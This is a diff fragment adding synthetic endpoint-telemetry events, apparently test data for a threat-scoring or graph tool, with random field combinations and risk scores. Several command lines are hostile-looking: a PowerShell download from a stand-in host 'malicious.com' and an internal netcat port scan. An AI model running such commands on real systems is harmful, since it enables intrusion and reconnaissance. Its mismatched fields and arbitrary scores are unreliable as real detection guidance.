+  },
+  {
+    "event_id": "0fb2bd7f-831e-40b2-96a9-376d389f6bd5",
+    "timestamp": "2025-06-09T06:50:18.024014Z",
+    "user": "charlie",
+    "exe": "/usr/bin/nc",
+    "cmdline": "powershell Invoke-WebRequest http://malicious.com",
+    "pid": "6748",
+    "ppid": "995",
+    "tags": [
+      "hostname_enum",
+      "script_exec"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.64,
+    "risk_level": "medium",
+    "is_graph_node": true,
+    "linked_tags": [
+      "hostname_enum",
+      "script_exec"
+    ]
+  },
+  {
+    "event_id": "0b72d5af-9884-4097-95bb-12bc825093e6",
+    "timestamp": "2025-06-09T15:58:18.024065Z",
+    "user": "bob",
+    "exe": "/usr/bin/nc",
+    "cmdline": "nc -zv 192.168.1.1 1-1000",
+    "pid": "3527",
+    "ppid": "309",
+    "tags": [
+      "nmap"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.83,
+    "risk_level": "high",
+    "is_graph_node": true,
+    "linked_tags": [
+      "nmap"
+    ]
+  },
+  {
+    "event_id": "f263cc16-26d3-4f18-9e3d-3efc349c641d",
+    "timestamp": "2025-06-10T03:03:18.024108Z",
+    "user": "alice",
+    "exe": "powershell.exe",
+    "cmdline": "svchost.exe /service",
+    "pid": "8949",
+    "ppid": "204",
+    "tags": [
+      "nmap"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.31,
+    "risk_level": "low",
+    "is_graph_node": true,
+    "linked_tags": [
+      "nmap"
+    ]
+  },
+  {
+    "event_id": "2ec84f36-465d-48c3-92b6-a3607f52ebe2",
+    "timestamp": "2025-06-09T15:39:18.024148Z",
+    "user": "charlie",
+    "exe": "powershell.exe",
+    "cmdline": "nc -zv 192.168.1.1 1-1000",
+    "pid": "9251",
+    "ppid": "230",
+    "tags": [
+      "nmap",
+      "script_exec",
+      "internal_port_scan"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.93,
+    "risk_level": "high",
+    "is_graph_node": true,
+    "linked_tags": [
+      "nmap",
+      "script_exec",
+      "internal_port_scan"
+    ]
+  },
+  {
+    "event_id": "fcadb2c3-2270-42a5-b552-87fe2d5f52e9",
+    "timestamp": "2025-06-10T00:08:18.024194Z",
+    "user": "bob",
+    "exe": "/bin/bash",
+    "cmdline": "nc -zv 192.168.1.1 1-1000",
+    "pid": "6065",
+    "ppid": "316",
+    "tags": [
+      "hidden_window",
+      "hostname_enum"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.56,
+    "risk_level": "medium",
+    "is_graph_node": true,
+    "linked_tags": [
+      "hidden_window",
+      "hostname_enum"
+    ]
+  },
+  {
+    "event_id": "30916bad-fdb7-4241-9cbe-19c8d2c1e056",
+    "timestamp": "2025-06-09T12:18:18.024247Z",
+    "user": "bob",
+    "exe": "svchost.exe",
+    "cmdline": "python -m SimpleHTTPServer",
+    "pid": "3620",
+    "ppid": "639",
+    "tags": [
+      "doc_opened",
+      "cloud_console",
+      "script_exec"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.42,
+    "risk_level": "low",
+    "is_graph_node": true,
+    "linked_tags": [
+      "doc_opened",
+      "cloud_console",
+      "script_exec"
+    ]
+  },
+  {
+    "event_id": "c3cff487-b96d-48a4-9cf0-e93d9d352732",
+    "timestamp": "2025-06-09T21:31:18.024299Z",
+    "user": "bob",
+    "exe": "svchost.exe",
+    "cmdline": "nc -zv 192.168.1.1 1-1000",
+    "pid": "3027",
+    "ppid": "693",
+    "tags": [
+      "hostname_enum"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.42,
+    "risk_level": "low",
+    "is_graph_node": true,
+    "linked_tags": [
+      "hostname_enum"
+    ]
+  },
+  {
+    "event_id": "06c21e9a-3973-4ee7-9a5b-9ceacc2c1046",
+    "timestamp": "2025-06-09T08:33:18.024380Z",
+    "user": "admin",
+    "exe": "/usr/bin/nc",
+    "cmdline": "python -m SimpleHTTPServer",
+    "pid": "2670",
+    "ppid": "920",
+    "tags": [
+      "script_exec",
+      "nmap"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.75,
+    "risk_level": "medium",
+    "is_graph_node": true,
+    "linked_tags": [
+      "script_exec",
+      "nmap"
+    ]
+  },
+  {
+    "event_id": "1e66566d-8835-41a4-af93-8cb4090806dd",
+    "timestamp": "2025-06-09T04:23:18.024514Z",
+    "user": "admin",
+    "exe": "/usr/bin/nc",
+    "cmdline": "svchost.exe /service",
+    "pid": "1579",
+    "ppid": "698",
+    "tags": [
+      "script_exec",
+      "auth_attempt"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.69,
+    "risk_level": "medium",
+    "is_graph_node": true,
+    "linked_tags": [
+      "script_exec",
+      "auth_attempt"
+    ]
+  },
+  {
+    "event_id": "91e6c703-d1a9-4724-9d89-e041be04fbdd",
+    "timestamp": "2025-06-09T08:44:18.024605Z",
+    "user": "admin",
+    "exe": "powershell.exe",
+    "cmdline": "svchost.exe /service",
+    "pid": "9102",
+    "ppid": "516",
+    "tags": [
+      "cloud_console"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.82,
+    "risk_level": "high",
+    "is_graph_node": true,
+    "linked_tags": [
+      "cloud_console"
+    ]
+  },
+  {
+    "event_id": "d867d715-c4df-4bb4-97a6-c4919484f4e0",
+    "timestamp": "2025-06-09T22:04:18.024652Z",
+    "user": "admin",
+    "exe": "/usr/bin/nc",
+    "cmdline": "powershell Invoke-WebRequest http://malicious.com",
+    "pid": "5613",
+    "ppid": "316",
+    "tags": [
+      "script_exec"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.63,
+    "risk_level": "medium",
+    "is_graph_node": true,
+    "linked_tags": [
+      "script_exec"
+    ]
+  },
+  {
+    "event_id": "f745c195-1384-4674-a561-460827a8f350",
+    "timestamp": "2025-06-09T04:09:18.024689Z",
+    "user": "bob",
+    "exe": "/usr/bin/nc",
+    "cmdline": "python -m SimpleHTTPServer",
+    "pid": "4726",
+    "ppid": "124",
+    "tags": [
+      "script_exec"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.39,
+    "risk_level": "low",
+    "is_graph_node": true,
+    "linked_tags": [
+      "script_exec"
+    ]
+  },
+  {
+    "event_id": "d2984203-588e-4f97-a4bf-5a34ac20f7a1",
+    "timestamp": "2025-06-10T00:00:18.024720Z",
+    "user": "bob",
+    "exe": "python.exe",
+    "cmdline": "bash -c 'while true; do echo hello; done'",
+    "pid": "2168",
+    "ppid": "932",
+    "tags": [
+      "doc_opened",
+      "spread_path"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.84,
+    "risk_level": "high",
+    "is_graph_node": true,
+    "linked_tags": [
+      "doc_opened",
+      "spread_path"
+    ]
+  },
+  {
+    "event_id": "c501feef-06e3-4405-b3ff-91cd64863503",
+    "timestamp": "2025-06-09T15:24:18.024762Z",
+    "user": "admin",
+    "exe": "python.exe",
+    "cmdline": "python -m SimpleHTTPServer",
+    "pid": "2457",
+    "ppid": "602",
+    "tags": [
+      "internal_port_scan"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.75,
+    "risk_level": "medium",
+    "is_graph_node": true,
+    "linked_tags": [
+      "internal_port_scan"
+    ]
+  },
+  {
+    "event_id": "15a2e703-b551-4bc8-8417-5679a66dd094",
+    "timestamp": "2025-06-09T19:08:18.024800Z",
+    "user": "bob",
+    "exe": "powershell.exe",
+    "cmdline": "nc -zv 192.168.1.1 1-1000",
+    "pid": "4386",
+    "ppid": "838",
+    "tags": [
+      "hidden_window"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.83,
+    "risk_level": "high",
+    "is_graph_node": true,
+    "linked_tags": [
+      "hidden_window"
+    ]
+  },
+  {
+    "event_id": "91208bb3-097e-44d2-8d4f-303ee94b6fd0",
+    "timestamp": "2025-06-09T19:23:18.024838Z",
+    "user": "charlie",
+    "exe": "python.exe",
+    "cmdline": "svchost.exe /service",
+    "pid": "5334",
+    "ppid": "584",
+    "tags": [
+      "internal_port_scan",
+      "cloud_console",
+      "suspicious_clipboard_usage"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.59,
+    "risk_level": "medium",
+    "is_graph_node": true,
+    "linked_tags": [
+      "internal_port_scan",
+      "cloud_console",
+      "suspicious_clipboard_usage"
+    ]
+  },
+  {
+    "event_id": "0d78c3de-8727-4145-ad3e-ffce4c3b7f92",
+    "timestamp": "2025-06-09T03:59:18.024863Z",
+    "user": "charlie",
+    "exe": "python.exe",
+    "cmdline": "python -m SimpleHTTPServer",
+    "pid": "6607",
+    "ppid": "962",
+    "tags": [
+      "hostname_enum",
+      "nmap"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.84,
+    "risk_level": "high",
+    "is_graph_node": true,
+    "linked_tags": [
+      "hostname_enum",
+      "nmap"
+    ]
+  },
+  {
+    "event_id": "4113f5ca-1aa3-4d8a-bfe6-16081e6a0b05",
+    "timestamp": "2025-06-09T13:25:18.024905Z",
+    "user": "admin",
+    "exe": "/bin/bash",
+    "cmdline": "python -m SimpleHTTPServer",
+    "pid": "7425",
+    "ppid": "599",
+    "tags": [
+      "doc_opened",
+      "hostname_enum"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.78,
+    "risk_level": "medium",
+    "is_graph_node": true,
+    "linked_tags": [
+      "doc_opened",
+      "hostname_enum"
+    ]
+  },
+  {
+    "event_id": "043cd776-3afa-4236-881e-36fcfd06fd26",
+    "timestamp": "2025-06-09T10:29:18.024939Z",
+    "user": "charlie",
+    "exe": "python.exe",
+    "cmdline": "bash -c 'while true; do echo hello; done'",
+    "pid": "1319",
+    "ppid": "573",
+    "tags": [
+      "nmap",
+      "script_exec",
+      "suspicious_clipboard_usage"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.57,
+    "risk_level": "medium",
+    "is_graph_node": true,
+    "linked_tags": [
+      "nmap",
+      "script_exec",
+      "suspicious_clipboard_usage"
+    ]
+  },
+  {
+    "event_id": "5def984d-11bc-454f-bf96-2cdbd0da73a3",
+    "timestamp": "2025-06-10T00:09:18.024974Z",
+    "user": "admin",
+    "exe": "svchost.exe",
+    "cmdline": "svchost.exe /service",
+    "pid": "1043",
+    "ppid": "716",
+    "tags": [
+      "suspicious_clipboard_usage",
+      "auth_attempt"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.53,
+    "risk_level": "medium",
+    "is_graph_node": true,
+    "linked_tags": [
+      "suspicious_clipboard_usage",
+      "auth_attempt"
+    ]
+  },
+  {
+    "event_id": "f477274c-b2d9-4f3a-b04c-cc3b5876ae6d",
+    "timestamp": "2025-06-09T23:55:18.025007Z",
+    "user": "charlie",
+    "exe": "powershell.exe",
+    "cmdline": "powershell Invoke-WebRequest http://malicious.com",
+    "pid": "5592",
+    "ppid": "465",
+    "tags": [
+      "script_exec"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.83,
+    "risk_level": "high",
+    "is_graph_node": true,
+    "linked_tags": [
+      "script_exec"
+    ]
+  },
+  {
+    "event_id": "12b75ca5-57c5-4f9c-a163-a2997aacad1f",
+    "timestamp": "2025-06-09T05:28:18.025038Z",
+    "user": "alice",
+    "exe": "svchost.exe",
+    "cmdline": "svchost.exe /service",
+    "pid": "7521",
+    "ppid": "177",
+    "tags": [
+      "nmap",
+      "hidden_window",
+      "suspicious_clipboard_usage"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.44,
+    "risk_level": "low",
+    "is_graph_node": true,
+    "linked_tags": [
+      "nmap",
+      "hidden_window",
+      "suspicious_clipboard_usage"
+    ]
+  },
+  {
+    "event_id": "6d7664ee-2b1f-425a-8458-f4d486947810",
+    "timestamp": "2025-06-09T05:10:18.025060Z",
+    "user": "bob",
+    "exe": "powershell.exe",
+    "cmdline": "bash -c 'while true; do echo hello; done'",
+    "pid": "7915",
+    "ppid": "722",
+    "tags": [
+      "suspicious_clipboard_usage"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.4,
+    "risk_level": "low",
+    "is_graph_node": true,
+    "linked_tags": [
+      "suspicious_clipboard_usage"
+    ]
+  },
+  {
+    "event_id": "8c042bd8-2226-42b1-9094-4d7be445d874",
+    "timestamp": "2025-06-09T18:18:18.025078Z",
+    "user": "alice",
+    "exe": "/bin/bash",
+    "cmdline": "powershell Invoke-WebRequest http://malicious.com",
+    "pid": "7189",
+    "ppid": "986",
+    "tags": [
+      "script_exec",
+      "internal_port_scan"
+    ],
+    "rule_hits": [],
+    "risk_score": 0.82,
+    "risk_level": "high",
+    "is_graph_node": true,
+    "linked_tags": [
+      "script_exec",
+      "internal_port_scan"
+    ]
+  }
+]
